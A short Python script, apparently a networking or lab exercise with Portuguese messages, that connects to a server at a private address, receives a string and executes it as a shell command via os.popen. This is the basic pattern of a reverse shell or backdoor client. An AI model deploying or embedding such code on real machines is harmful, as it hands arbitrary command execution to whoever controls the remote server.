#!/usr/bin/env python3

import socket
import sys
import os

HOST = '10.0.5.100'
PORT = 3334
size = 1024
CLIENT = (HOST, PORT)
cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cliente.connect(CLIENT)

while True:
    print("Conectado ao servidor.")
    retorno_servidor = cliente.recv(size).decode()
    print(f"Recebido do servidor {retorno_servidor}")
    print(f"Executando o comando: {retorno_servidor}")
    print(os.popen(retorno_servidor).read())
    break

cliente.close()